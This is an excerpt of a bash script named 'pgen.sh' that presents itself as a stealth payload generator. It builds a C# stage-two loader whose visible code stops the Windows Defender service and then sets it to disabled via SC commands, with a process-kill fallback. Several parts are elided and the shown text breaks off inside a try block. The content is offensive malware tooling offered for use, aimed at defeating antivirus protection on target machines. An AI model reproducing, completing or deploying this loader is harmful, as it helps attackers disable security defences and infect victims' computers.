#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator – PowerShell + SC Defender Disabler
...
# ========== C# STAGE2 LOADER (EXE) – Improved Defender Disabler with SC ==========
echo -e "${YELLOW}[3/5] Creating C# Stage2 loader (enhanced defender disabler)...${NC}"
    ...
    class Program
    {
        ...
        static void Main()
        {
            ...
            try
            {
                ...
                // 3. Stop and disable Windows Defender service using SC (more reliable)
                RunSC("stop WinDefend");
                Log("SC stop WinDefend issued.");
                Thread.Sleep(5000);
                RunSC("config WinDefend start= disabled");
                Log("SC config WinDefend disabled issued.");

                // 4. Force kill the process if service still running (fallback)
                try {
